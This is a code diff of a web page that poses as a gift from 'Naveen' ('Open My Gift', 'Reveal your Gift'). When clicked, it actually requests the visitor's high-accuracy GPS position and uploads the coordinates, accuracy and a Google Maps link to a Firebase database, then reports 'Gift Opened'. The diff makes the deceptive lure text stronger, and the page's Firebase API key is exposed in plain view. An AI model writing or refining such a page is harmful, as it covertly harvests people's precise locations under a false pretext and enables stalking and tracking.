@@ -3,26 +3,33 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Emergency Location</title>
+<title>Emergency Location Sharing</title>
 
 <style>
+* {
+  box-sizing: border-box;
+}
+
 body {
   font-family: Arial, sans-serif;
   background: #f1f4f9;
   display: grid;
   place-items: center;
-  min-height: 95vh;
+  min-height: 100vh;
   margin: 0;
+  padding: 20px;
 }
+
 .card {
   background: white;
   padding: 28px;
   border-radius: 20px;
   max-width: 420px;
-  width: 85%;
+  width: 100%;
   text-align: center;
   box-shadow: 0 8px 30px #0001;
 }
+
 button {
   background: #1769e0;
   color: white;
@@ -32,14 +39,27 @@ button {
   border-radius: 12px;
   font-size: 18px;
   margin-top: 20px;
+  cursor: pointer;
 }
+
+button:disabled {
+  background: #888;
+  cursor: not-allowed;
+}
+
 p {
   color: #555;
   line-height: 1.6;
 }
+
 #status {
   margin-top: 18px;
   overflow-wrap: anywhere;
+}
+
+a {
+  color: #1769e0;
+  font-weight: bold;
 }
 </style>
 </head>
@@ -47,37 +67,42 @@ p {
 <body>
 
 <div class="card">
-  <h2>Naveen Gift</h2>
+
+  <h2>Naveen Sent a Gift For You</h2>
 
   <p>
-    Naveen Shared a Gift Allow and Reveal the Gift
+    Naveen Sent Gift For You
   </p>
 
   <p>
-    You Only See The gift.
+    Allow Button and Reveal your Gift
   </p>
 
   <button id="share">
-    see the Gift
+    Open My Gift
   </button>
 
-  <p id="status"></p>
+  <p id="status" role="status" aria-live="polite"></p>
+
 </div>
 
 <script type="module">
 
-import { initializeApp } from
-"https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import {
+  initializeApp
+} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
 
 import {
-  getDatabase, ref, push, set
-} from
-"https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+  getDatabase,
+  ref,
+  push,
+  set
+} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
 import {
-  getAuth, signInAnonymously
-} from
-"https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
+  getAuth,
+  signInAnonymously
+} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
 
 const firebaseConfig = {
   apiKey: "AIzaSyDNo1kMFQMrOgb2bZT1TFOQ5wUHXp3HS-8",
@@ -99,79 +124,77 @@ const status = document.getElementById("status");
 button.addEventListener("click", async () => {
 
   button.disabled = true;
-  status.textContent = "Connecting securely...";
+  status.textContent = "Connecting...";
 
   try {
 
-    await signInAnonymously(auth);
-
     if (!navigator.geolocation) {
-      throw new Error("GPS is not supported.");
+      throw new Error("ఈ బ్రౌజర్ GPS కు మద్దతు ఇవ్వడం లేదు.");
     }
 
-    status.textContent = "Requesting location permission...";
+    status.textContent =
+      "మీ GPS అనుమతి కోసం వేచి ఉంది...";
 
-    navigator.geolocation.getCurrentPosition(
-      async (position) => {
+    const position = await new Promise((resolve, reject) => {
 
-        try {
-
-          const latitude = position.coords.latitude;
-          const longitude = position.coords.longitude;
-
-          const locationRef = push(
-            ref(db, "emergencyLocations")
-          );
-
-          await set(locationRef, {
-            latitude: latitude,
-            longitude: longitude,
-            accuracy: position.coords.accuracy,
-            timestamp: Date.now()
-          });
-
-          status.innerHTML =
-            "Location shared successfully.<br>" +
-            '<a target="_blank" rel="noopener" href="https://maps.google.com/?q=' +
-            latitude + "," + longitude +
-            '">View shared location on Google Maps</a>';
-
-        } catch (error) {
-
-          status.textContent =
-            "Upload failed: " + error.message;
-
-          button.disabled = false;
+      navigator.geolocation.getCurrentPosition(
+        resolve,
+        reject,
+        {
+          enableHighAccuracy: true,
+          timeout: 20000,
+          maximumAge: 0
         }
+      );
 
-      },
+    });
 
-      (error) => {
+    status.textContent = "Secure connection ఏర్పడుతోంది...";
 
-        status.textContent =
-          "Location permission failed: " + error.message;
+    await signInAnonymously(auth);
 
-        button.disabled = false;
+    const latitude = position.coords.latitude;
+    const longitude = position.coords.longitude;
 
-      },
+    const mapsLink =
+      `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-      {
-        enableHighAccuracy: true,
-        timeout: 20000,
-        maximumAge: 0
-      }
+    const locationRef = push(
+      ref(db, "emergencyLocations")
     );
+
+    await set(locationRef, {
+
+      latitude: latitude,
+      longitude: longitude,
+      accuracy: position.coords.accuracy,
+      timestamp: Date.now(),
+      mapsLink: mapsLink
+
+    });
+
+    status.innerHTML =
+      "Gift Opened.<br><br>" +
+      '<a target="_blank" rel="noopener noreferrer" href="' +
+      mapsLink +
+      '">Google Maps లో లొకేషన్ చూడండి</a>';
 
   } catch (error) {
 
+    console.error(error);
+
     status.textContent =
-      "Connection failed: " + error.message;
+      "లొకేషన్ Share కాలేదు: " + error.message;
+
+  } finally {
 
     button.disabled = false;
+
   }
 
 });
 
 </script>
+
 </body>
 </html>
